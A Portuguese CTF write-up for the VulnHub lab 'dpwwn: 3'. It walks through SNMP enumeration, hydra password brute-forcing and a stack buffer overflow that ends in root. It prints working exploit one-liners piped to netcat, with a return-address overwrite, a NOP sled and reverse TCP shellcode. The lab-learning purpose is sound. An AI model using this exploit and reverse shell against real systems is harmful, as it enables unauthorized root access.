---
title: 'VulnHub dpwwn: 3'
excerpt: "Desafio CTF <strong><a href=''>VulnHub dpwwn: 3</a></strong> Realizado para aprendizado sobre conceitos de segurança da informação."
date: 2019-09-04 17:08:43
tags: 
  - Hacking
  - Tutorial
  - Segurança da informação
  - CTF
cover: https://cdn-images-1.medium.com/max/800/1*SnTSI7XJVVSEbtQ_Oov1Vw.png
cover_creditos:
default_cover:
---

Hello friends.

### Informações sobre o Alvo.

A flag esta em /root/dpwwn-03-FLAG.txt

### Reconhecimento / Enumeração.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*SnTSI7XJVVSEbtQ_Oov1Vw.png" alt="">
      <figcaption></figcaption>
    </figure>

netdiscover

O ip do alvo é o 192.168.1.6

Usando “nmap” para lista portas e serviços e verificar se há alguma vulnerabilidade.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*Ab8IjcenPVBICCGnxHOKIw.png" alt="">
      <figcaption></figcaption>
    </figure>

nmap

Achamos uma porta “snmp” aberta e vamos usar o snmpwalk para verificar se obtemos alguma informação interessante.

> O SnmpWalk permite detectar um conjunto de variáveis ​​disponíveis para leitura em um dispositivo individual. Você pode obter uma lista completa ou apenas parte.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*3SIG-mlA6i6j1x9dsYRscA.png" alt="">
      <figcaption></figcaption>
    </figure>

snmpwalk

Encontramos algo que nos interessa, um possível usuário “john <john@dpwwn-03>” e também uma dica para a senha “john room”.  
Vamos gerar uma pequena wordlist com o John the Ripper.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*wccbilWDvcpwo2d8IB0j_A.png" alt="">
      <figcaption></figcaption>
    </figure>

John the Ripper.

Depois de criar a wordlist vamos usar o hydra para testar a wordlist gerada.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*5b0P3iyh6y1SYVmMlqfTEQ.png" alt="">
      <figcaption></figcaption>
    </figure>

hydra.

Temos um usuário e uma senha valida.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*kQjBctnF4ruIHw9HK5ynCw.png" alt="">
      <figcaption></figcaption>
    </figure>

ganhado acesso ao servidor.

Podemos executar apenas um comando com “sudo”.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*9Ef43Gevswev7ZHjVwnUqQ.png" alt="">
      <figcaption></figcaption>
    </figure>

ss.sh

Ao verificar o arquivo “ss.sh” notamos que não podemos modificar o “PATH” e o “SHELL” só nos resta explorar o “smashthestack”.  
Depois de alguns testes conseguimos sobrescrever o endereço de retorno da função “vulncode” o payload esta logo abaixo.

> (python -c ‘print “A”\*732+”B”\*4+”C”\*4’;cat) | nc 127.0.0.1 3210

Para seguir com a exploração tive que abrir 3 terminais, um para o “gdb”, mais um para o “netcat” e outro para enviar o payload.  
Adicionei um **breakpoint** no endereço de retorno da “vulncode”, para depois analisar o que esta acontecendo na pilha.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*JjBpWOI4_xwDIKKNk8CdWA.png" alt="">
      <figcaption></figcaption>
    </figure>

gdb

Depois de enviar o payload e cair no breakpoint, eu verifiquei que o “0x42424242” são os meus 4 “B” que foi enviado no payload, e tambem que ele esta no topo da pilha, coso eu continue o programa vamos receber um “Segmentation fault” pois não existe o endereço de memória “0x42424242”.

Precisamos agora procurar um shellcode reverso, já que na execução do script “ss.sh” ele executa em background o “smashthestack”.

[**Linux/x86 - Shell Reverse TCP Shellcode - 74 bytes**  
_\* Title: Shell Reverse TCP Shellcode - 74 bytes \* Platform: Linux/x86 \* Date: 2014-07-25 \* Author: Julien Ahrens…_shell-storm.org](http://shell-storm.org/shellcode/files/shellcode-883.php "http://shell-storm.org/shellcode/files/shellcode-883.php")[](http://shell-storm.org/shellcode/files/shellcode-883.php)

O nosso payload teve algumas modificações, 0xbffff220 vai sobrescrever nosso endereço de retorno e apotar para o “\\x90”, os “\\ x90” informam ao programa para passar à próxima instrução até chegar no nosso shellcode de 74 bytes.

> (python -c ‘import struct; print “A”\*732+struct.pack(“<I”, 0xbffff220)+”\\x90"\*20+”\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x53\\x6  
> a\\x02\\x89\\xe1\\xcd\\x80\\x92\\xb0\\x66\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x05\\x39\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\x43\\xcd\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80"’;cat) | nc 127.0.0.1 3210

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*zVXBE-aoc_lJ483C_JYcgw.png" alt="">
      <figcaption></figcaption>
    </figure>

gdb

Depois de rodar nosso payload, verificamos novamente a pilha e tudo esta como nos planejamos, e damos continuidade a nosso programa.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*716I4Hg6iMKcuszQNhoxHA.png" alt="">
      <figcaption></figcaption>
    </figure>

netcat.

A nossa shell reversa funciona :)  
Como já era previsto tive que ajustar o endereço de retorno com mais 5 bytes passando o endereço 0xbffff220 para 0xbffff225.

> (python -c ‘import struct; print “A”\*732+struct.pack(“<I”,0xbffff220+5)+”\\x90"\*20+”\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x92\\xb0\\x66\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x05\\x39\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\x43\\xcd\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80"’;cat) | nc 127.0.0.1 3210

Vamos executar o programa com “sudo”.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*xh1Dcr_I160MBOV3vsMiqQ.png" alt="">
      <figcaption></figcaption>
    </figure>

sudo.

Recebemos uma nova conexão, e agora somos root no sistema basta manter o acesso.

<figure class="image">
      <img src="https://cdn-images-1.medium.com/max/800/1*RhifNqHPdRsrIG_wOq0JdQ.png" alt="">
      <figcaption></figcaption>
    </figure>

root

Se você chegou até aqui e não entendeu o que é um payload, breakpoint, shellcode, shell reversa etc. Tem um playlist no [**Papo Binário**](https://www.youtube.com/watch?v=Ps3mZWQz01s&list=PLIfZMtpPYFP4MaQhy_iR8uM0mJEs7P7s3) que pode te ajudar.

Até a próxima.